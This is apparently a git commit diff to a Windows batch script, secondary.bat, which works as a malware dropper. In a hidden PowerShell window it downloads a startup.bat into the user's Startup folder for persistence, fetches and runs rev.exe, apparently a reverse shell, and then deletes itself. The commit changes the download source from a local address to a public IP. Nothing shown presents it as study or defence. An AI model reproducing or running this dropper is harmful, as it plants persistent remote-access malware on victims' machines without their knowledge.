5946bcef3bc9a2d53d5ea5ab6e8efc77e3012e07
saif <saif.aboueldahab@gmail.com>
2023-07-10 18:29:14 +0300

    final

--- secondary.bat
+++ secondary.bat
@@ -2,8 +2,8 @@
 del Starter.bat
 set "currentd=%cd%"
 cd "C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
-powershell -windowstyle hidden curl -o startup.bat http://192.168.1.9:9000/startup.bat
+powershell -windowstyle hidden curl -o startup.bat http://34.88.221.44:9000/startup.bat
 cd %currentd%
-powershell -windowstyle hidden curl -o rev.exe http://192.168.1.9:9000/rev.exe
+powershell -windowstyle hidden curl -o rev.exe http://34.88.221.44:9000/rev.exe
 rev.exe
 del "%~f0"
